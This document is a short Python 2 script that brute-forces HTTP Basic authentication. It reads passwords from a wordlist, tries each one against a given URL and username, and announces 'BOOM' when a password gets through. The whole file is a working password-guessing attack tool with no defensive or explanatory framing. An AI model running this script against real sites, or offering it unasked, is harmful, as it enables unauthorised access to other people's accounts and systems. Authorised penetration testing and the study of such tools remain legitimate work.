import urllib2
import sys
pass_mg = urllib2.HTTPPasswordMgrWithDefaultRealm()
url = sys.argv[1]
listpath = sys.argv[2]
user = sys.argv[3]
fd = open(listpath,'r')
for ps in fd.readlines():
    password = ps.strip('\n')
    pass_mg.add_password(None, url, user, password)
    handler = urllib2.HTTPBasicAuthHandler(pass_mg)
    opener = urllib2.build_opener(handler)
    print password
    try:
        x = opener.open(url)
        if x.code == 200:
            print "\nBOOM - Your Password for username "+ user +" is : " + password
            break
    except:
        pass
fd.close()
